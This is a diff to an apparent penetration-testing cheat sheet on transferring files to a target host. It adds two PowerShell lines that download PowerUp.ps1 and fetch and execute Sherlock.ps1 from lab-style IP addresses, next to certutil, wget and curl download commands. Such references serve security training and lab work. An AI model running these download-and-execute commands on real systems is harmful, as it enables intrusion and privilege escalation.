@@ -16,9 +16,12 @@ python3 -m http.server <port>
 certutil.exe -urlcache -f http://<address>/<path to file>:<port> <name file>
 iwr "http://<your-ip>:<port>/<path to file>" -o <output file>
 (iwr = invoke-webrequest)
+echo IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
+echo IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.21/Sherlock.ps1') | powershell -noprofile -
 **Linux**
 wget http://<link to file>
 curl http://<link to file>
+
 ~~~
 
 # Netcat
